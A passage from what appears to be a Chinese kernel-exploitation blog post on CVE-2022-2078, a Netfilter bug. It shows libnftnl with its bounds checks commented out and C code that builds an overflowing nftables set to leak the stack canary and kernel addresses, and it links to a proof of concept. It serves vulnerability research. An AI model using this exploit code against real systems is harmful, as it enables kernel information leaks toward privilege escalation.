class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">expr_list</span>;</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后去掉对应的check:</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> NFTNL_SET_DESC_CONCAT:</span><br><span class="line"><span class="comment">// 	if (data_len &gt; sizeof(s-&gt;desc.field_len))</span></span><br><span class="line"><span class="comment">// 		return -1;</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(s-&gt;desc.field_len,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(s-&gt;desc.field_len, data, data_len);</span><br><span class="line">	<span class="keyword">while</span> (s-&gt;desc.field_len[++s-&gt;desc.field_count]) {</span><br><span class="line">		<span class="comment">// if (s-&gt;desc.field_count &gt;= NFT_REG32_COUNT)</span></span><br><span class="line">		<span class="comment">// 	break;</span></span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">break</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>现在我们可以开始编写漏洞利用了. 当我编写完一个demo, 运行却报错-EBIG 这说明对field_len的check没有通过. 我觉得比较奇怪, 因为理论上0x7FFFFFFF的值是能通过该check的.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">create_leak_set</span><span class="params">(<span class="keyword">struct</span> mnl_socket* nl, <span class="type">char</span>* table_name, <span class="type">char</span>* set_name, <span class="type">uint16_t</span> family,<span class="type">int</span>* seq)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nftnl_set</span> *<span class="title">s</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    s = nftnl_set_alloc();</span><br><span class="line">	<span class="keyword">if</span> (s == <span class="literal">NULL</span>) {</span><br><span class="line">		perror(<span class="string">"OOM"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> buf[<span class="number">0x100</span>] = {<span class="number">0</span>};</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; NFT_REG32_COUNT; ++i)</span><br><span class="line">    {</span><br><span class="line">        buf[i] = <span class="number">0x41</span>;</span><br><span class="line">    }</span><br><span class="line">    buf[NFT_REG32_COUNT] = <span class="number">0x7FFFFFFF</span>;</span><br><span class="line"></span><br><span class="line">	nftnl_set_set_str(s, NFTNL_SET_TABLE, table_name);</span><br><span class="line">	nftnl_set_set_str(s, NFTNL_SET_NAME, set_name);</span><br><span class="line">	nftnl_set_set_u32(s, NFTNL_SET_FAMILY, family);</span><br><span class="line">	nftnl_set_set_u32(s, NFTNL_SET_KEY_LEN, <span class="keyword">sizeof</span>(<span class="type">uint16_t</span>));</span><br><span class="line">	nftnl_set_set_u32(s, NFTNL_SET_KEY_TYPE, <span class="number">0</span>);</span><br><span class="line">	nftnl_set_set_u32(s, NFTNL_SET_ID, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    nftnl_set_set_u32(s,NFTNL_SET_DESC_SIZE,<span class="number">1</span>);</span><br><span class="line">    nftnl_set_set_data(s,NFTNL_SET_DESC_CONCAT,buf,(NFT_REG32_COUNT+<span class="number">1</span>)*<span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> send_batch_request(</span><br><span class="line">        nl,</span><br><span class="line">        NFT_MSG_NEWSET | (NFT_TYPE_SET &lt;&lt; <span class="number">8</span>),</span><br><span class="line">        NLM_F_CREATE, family, (<span class="type">void</span>**)&amp;s, seq,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>于是查看汇编, 发现是编译优化导致的. 除32被移到了等式右边.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/20241202202328.png"></p>
+<p>这导致我们能写入的最大值是0x43, 这极大的限制了我们思路4的实践, 因为在最大值0x43的情况下根本无法写入ROP链.笔者尝试编译了一些其他版本, 但均有这一优化, 其他的利用思路比如用思路3改写set上的dlen转堆溢出, 也都受这一限制的影响, 因为溢出点2会破坏udata字段, 思路四的绕过方式又不会真正的创建set而没办法进一步利用.<br>暂未找到在有这一优化的情况下的提权方式….. (有点思路, 挖个坑之后再回来试试)</p>
+<p>在不破坏nft_set-&gt;udata的情况下, 溢出点2最多能越界将0x20字节写入nft_set.令人欣喜的是, 笔者使用的内核将desc分配到了函数栈帧的栈底. 我们可以用这0x20字节泄露出canary, kernel_base以及page_offset_base.</p>
+<p>信息泄露的POC及测试环境: <a target="_blank" rel="noopener" href="https://github.com/Polaris-Snowfall/kernel_exploit/tree/main/CVE-2022-2078">CVE-2022-2078</a></p>
+<p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/20241202235848.png"></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://jamorant12138.github.io/2024/Dig%20into%20Netfilter%20(3)/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Netfilter/" rel="tag">Netfilter</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2024/Dig%20into%20Netfilter%20(4)/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            Dig into Netfilter (四) —— CVE-2022-34918
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2024/Dig%20into%20Netfilter%20(2)/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">Dig into Netfilter (二) —— CVE-2022-1015 / CVE-2022-1016</div>
+      </a>
+    
+  </nav>
+
+  
+   
+    
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2022-2024
+        <i class="ri-heart-fill heart_icon"></i> 翰青HanQi
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="北极落小雪"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/2022/About">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+<!-- ClickLove -->
+ 
+<script src="/js/clickLove.js"></script>
+ 
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</body>
+
+</html>
